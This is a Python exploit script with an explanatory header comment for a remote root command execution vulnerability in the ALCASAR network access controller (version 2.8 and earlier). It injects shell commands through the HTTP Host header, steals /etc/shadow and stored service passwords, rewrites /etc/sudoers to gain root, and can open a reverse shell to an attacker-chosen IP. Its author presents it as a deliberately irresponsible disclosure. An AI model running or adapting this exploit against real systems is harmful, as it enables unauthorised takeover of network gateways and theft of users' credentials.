#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
####
#
#    ALCASAR <= 2.8 Remote Root Code Execution Vulnerability
#
#    Author: eF
#    Date  : 2014-02-10
#
#
#        db         88           ,ad8888ba,         db         ad88888ba         db         88888888ba
#       d88b        88          d8"'    `"8b       d88b       d8"     "8b       d88b        88      "8b
#      d8'`8b       88         d8'                d8'`8b      Y8,              d8'`8b       88      ,8P
#     d8'  `8b      88         88                d8'  `8b     `Y8aaaaa,       d8'  `8b      88aaaaaa8P'
#    d8YaaaaY8b     88         88               d8YaaaaY8b      `"""""8b,    d8YaaaaY8b     88""""88'
#   d8""""""""8b    88         Y8,             d8""""""""8b           `8b   d8""""""""8b    88    `8b
#  d8'        `8b   88          Y8a.    .a8P  d8'        `8b  Y8a     a8P  d8'        `8b   88     `8b
# d8'          `8b  88888888888  `"Y8888Y"'  d8'          `8b  "Y88888P"  d8'          `8b  88      `8b
#
#
# ALCASAR is a free Network Access Controller which controls the Internet 
# consultation networks. It authenticates, attributes and protects users'
# access regardless their connected equipment (PC, smartphone, game console,
# etc.).
#
#
# ALCASAR Web UI, accessible by any unauthenticated user, suffers from a 
# trivial vulnerability. In the "index.php" file:
#
#   $pattern = preg_replace('/www./','',$_SERVER['HTTP_HOST']);
#   exec("grep -Re ^$pattern$ /etc/dansguardian/lists/blacklists/*/domains|cut -d'/' -f6", $output);
#
# By sending a specially crafted value in the "host" HTTP header, it is possible
# to inject the exec() function in order to execute commands as Apache user.
# 
# In addition, the Apache user is able to call sudo for these binaries:
# 
# 
/sbin/ip,/sbin/arping,/sbin/arp,/usr/sbin/arpscan,/usr/sbin/tcpdump,/usr/local/bin/alcasar-watchdog.sh,/usr/local/sbin/alcasar-dhcp.sh
# /usr/local/bin/alcasar-conf.sh
# /usr/local/sbin/alcasar-mysql.sh
# 
/usr/local/sbin/alcasar-bl.sh,/usr/local/sbin/alcasar-havp.sh,/usr/local/bin/alcasar-file-clean.sh,/usr/local/sbin/alcasar-url_filter.sh
# /usr/local/sbin/alcasar-nf.sh,/usr/local/bin/alcasar-iptables.sh,/usr/sbin/ipset 
# /usr/local/bin/alcasar-archive.sh
# /usr/bin/radwho,/usr/sbin/chilli_query
# /usr/local/sbin/alcasar-logout.sh
# /sbin/service,/usr/bin/killall,/sbin/chkconfig,/bin/systemctl
# /usr/bin/openssl
# 
# As a result, we can use /usr/bin/openssl to read a file as root:
# 
#   sudo /usr/bin/openssl base64 -in /etc/shadow -A | base64 -d
# 
# Or to create or overwrite files as root (create a cron job, edit /etc/sudoers, etc.):
#
#   echo cHduZWQK | sudo /usr/bin/openssl base64 -d -out /etc/cron.d/pwned
#
# In this exploit, I choose to modify the "sudoers" file.
# 
# Note: this vulnerability has been discovered in less than 30 seconds.
# Others vulnerabilities are still present. This code has never been audited...
# The PHP code is dreadful and needs to be rewritten from scratch.
#
# Example (post-auth) in file acc/admin/activity.php:
#
#   if (isset($_POST['action'])){
#       switch ($_POST['action']){
#            case 'user_disconnect' :
#               exec ("sudo /usr/sbin/chilli_query logout $_POST[mac_addr]");
#
#
# This is not a responsible disclosure coz' I have no sense of ethics and I couldn't care less.
#
#
# % python alcasar-2.8_rce.py alcasar.localdomain "alcasar-version.sh"
#
# [+] Hello, first here are some passwords for you:
# Password to protect the boot menu (GRUB) : cV9eEz1g
# Name and password of Mysql/mariadb administrator : root / FvYPr7b3
# Name and password of Mysql/mariadb user : radius / oRNln64j
# Shared secret between the script 'intercept.php' and coova-chilli : b9Rj34jz
# Shared secret between coova-chilli and FreeRadius : 7tIrnkJu
#
# root:$2a$08$Aw4yIxQIUJ0taDjiXKSRYu6zZB5eUcbZ4445vo1157AdeGSfe1XuC:16319:0:99999:7:::
#
# [...]
#
# admin:alcasar.localdomain:49b8642b4646a4afa38cda065f76ce0e
#
# username        value
# user    $1$passwd$qr0Ajhr12fZ475a2qAZ.H.
#
# [-] whoami (should be apache):
# uid=495(apache) gid=492(apache) groups=492(apache)
#
# [+] On the way to the uid 0...
# [-] Got root?
# uid=0(root) gid=0(root) groups=0(root)
#
# [+] Your command Sir:
# The Running version (2.8) is up to date
#
#
####

import sys, os, re, httplib

class PWN_Alcasar:

    def __init__(self, host):
        self.host = host
        self.root = False

    def exec_cmd(self, cmd, output=False):
        tag = os.urandom(4).encode('hex')

        cmd = 'bash -c "%s" 2>&1' % cmd.replace('"', '\\"')
        if self.root:
            cmd = 'sudo %s' % cmd

        headers = {
            'host' : 'aAaAa index.php;echo %s;echo %s|base64 -d -w0|sh|base64 -w0;#' % (tag, 
cmd.encode('base64').replace('\n',''))
        }

        c = httplib.HTTPConnection(self.host)
        c.request('GET', '/index.php', '', headers)
        r = c.getresponse()
        data = r.read()
        c.close()

        if data.find(tag) != -1:
            m = re.search(r'%s, (.*)\s</div>' % tag, data)
            if m:
                data = m.group(1).decode('base64')
                if output:
                    print data
                return data
        return None

    def read_file(self, filepath, output=True):
        return self.exec_cmd('sudo openssl base64 -in %s -A|base64 -d' % filepath, output=output)

    def read_passwords(self):
        self.read_file('/root/ALCASAR-passwords.txt')
        self.read_file('/etc/shadow')
        self.read_file('/usr/local/etc/digest/key_all')
        self.read_file('/usr/local/etc/digest/key_admin')
        self.read_file('/usr/local/etc/digest/key_backup')
        self.read_file('/usr/local/etc/digest/key_manager')
        self.read_file('/usr/local/etc/digest/key_only_admin')
        self.read_file('/usr/local/etc/digest/key_only_backup')
        self.read_file('/usr/local/etc/digest/key_only_manager')
        alcasar_mysql = self.read_file('/usr/local/sbin/alcasar-mysql.sh', output=False)
        if alcasar_mysql:
            m = re.search(r'radiuspwd="(.*)"', alcasar_mysql)
            if m:
                radiuspwd = m.group(1)
                sql = 'SELECT username,value FROM radcheck WHERE attribute like \'%%password%%\''
                self.exec_cmd('mysql -uradius -p\"%s\" radius -e "%s"' % (radiuspwd, sql), output=True)

    def edit_sudoers(self):
        self.exec_cmd('sudo openssl base64 -in /etc/sudoers -out /tmp/sudoers.b64')
        self.exec_cmd('openssl base64 -d -in /tmp/sudoers.b64 -out /tmp/sudoers')
        self.exec_cmd('sed -i s/BL,NF/BL,ALL,NF/g /tmp/sudoers')
        self.exec_cmd('sudo openssl base64 -in /tmp/sudoers -out /tmp/sudoers.b64')
        self.exec_cmd('sudo openssl base64 -d -in /tmp/sudoers.b64 -out /etc/sudoers')
        self.exec_cmd('sudo rm -f /tmp/sudoers*')
        self.root = True

    def reverse_shell(self, rip, rport='80'):
        payload = 'import socket,subprocess,os;'
        payload += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        payload += 's.connect((\'%s\',%s));' % (rip, rport)
        payload += 'os.dup2(s.fileno(),0);'
        payload += 'os.dup2(s.fileno(),1);'
        payload += 'os.dup2(s.fileno(),2);'
        payload += 'p=subprocess.call([\'/bin/sh\',\'-i\']);'
        return self.exec_cmd('python -c "%s"' % payload)

def usage():
    print 'Usage: %s host command (ip) (port)' % sys.argv[0]
    print '       "command" can be a shell command or "reverseshell"'
    sys.exit(0)
 
if __name__ == '__main__':

    if len(sys.argv) < 3:
        usage()
 
    cmd = sys.argv[2]
    if cmd == 'reverseshell':
        if len(sys.argv) < 5:
            print '[!] Need IP and port for the reverse shell...'
            sys.exit(0)
        rip = sys.argv[3]
        rport = sys.argv[4] # 80 is a good one...

    exploit = PWN_Alcasar(sys.argv[1])
    print '[+] Hello, first here are some passwords for you:'
    exploit.read_passwords()
    print '[-] whoami (should be apache):'
    exploit.exec_cmd('id', output=True)
    print '[+] On the way to the uid 0...'
    exploit.edit_sudoers()
    print '[-] Got root?'
    exploit.exec_cmd('id', output=True)
    if cmd == 'reverseshell':
        print '[+] You should now have a shell on %s:%s' % (rip, rport)
        exploit.reverse_shell(rip, rport)
    else:
        print '[+] Your command Sir:'
        exploit.exec_cmd(cmd, output=True)
    sys.exit(1)